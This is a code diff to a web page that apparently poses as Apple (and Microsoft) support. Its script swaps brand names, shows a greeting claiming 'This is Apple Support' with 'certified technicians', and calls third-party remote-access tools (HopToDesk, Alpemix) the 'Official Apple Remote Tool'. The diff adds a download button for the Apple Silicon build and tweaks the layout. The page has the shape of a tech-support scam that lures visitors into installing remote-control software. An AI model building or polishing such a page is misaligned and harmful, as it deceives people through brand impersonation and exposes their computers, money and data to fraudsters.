@@ -301,7 +301,7 @@
             text-decoration: none;
         }
 
-        /* Apple CTA group */
+        /* Apple CTA group - 3 buttons */
         .apple-cta-group {
             display: flex;
             gap: 12px;
@@ -313,7 +313,7 @@
             justify-content: center;
             min-width: 180px;
         }
-        @media (max-width: 480px) {
+        @media (max-width: 600px) {
             .apple-cta-group .ms-btn {
                 min-width: 100%;
             }
@@ -457,8 +457,9 @@
             if (isApple) {
                 container.innerHTML = `
                     <div class="apple-cta-group">
-                        <a href="https://dl.hoptodesk.com/HopToDesk.dmg" class="ms-btn ms-btn-primary" target="_blank" rel="noopener">Start remote session HTD</a>
-                        <a href="https://www.alpemix.com/en/macosx-files" class="ms-btn ms-btn-primary" target="_blank" rel="noopener">Start remote session Alpemix</a>
+                        <a href="https://dl.hoptodesk.com/HopToDesk.dmg" class="ms-btn ms-btn-primary" target="_blank" rel="noopener">HTD Intel</a>
+                        <a href="https://dl.hoptodesk.com/HopToDesk-silicon.dmg" class="ms-btn ms-btn-primary" target="_blank" rel="noopener">HTD Silicon</a>
+                        <a href="https://www.alpemix.com/en/macosx-files" class="ms-btn ms-btn-primary" target="_blank" rel="noopener">Alpemix</a>
                     </div>
                     <span class="ms-cta-help">Downloads the official Apple remote tool.</span>
                 `;
@@ -495,9 +496,6 @@
             document.getElementById('heroLede').innerHTML = 'This page helps you connect to Apple Technicians using <strong>Official Apple Remote Tool</strong>, a third‑party remote‑support tool. Please read what will happen and what is collected, then choose whether to continue. You can leave this page at any time.';
 
             document.getElementById('greetingText').textContent = '“This is Apple Support. You are connected to one of our certified technicians.”';
-
-            // Update the card title (optional – keep as "Start remote session")
-            // Already set in HTML, no change needed.
 
             document.getElementById('footerLine').innerHTML = document.getElementById('footerLine').innerHTML.replace(/Microsoft/g, 'Apple');
 
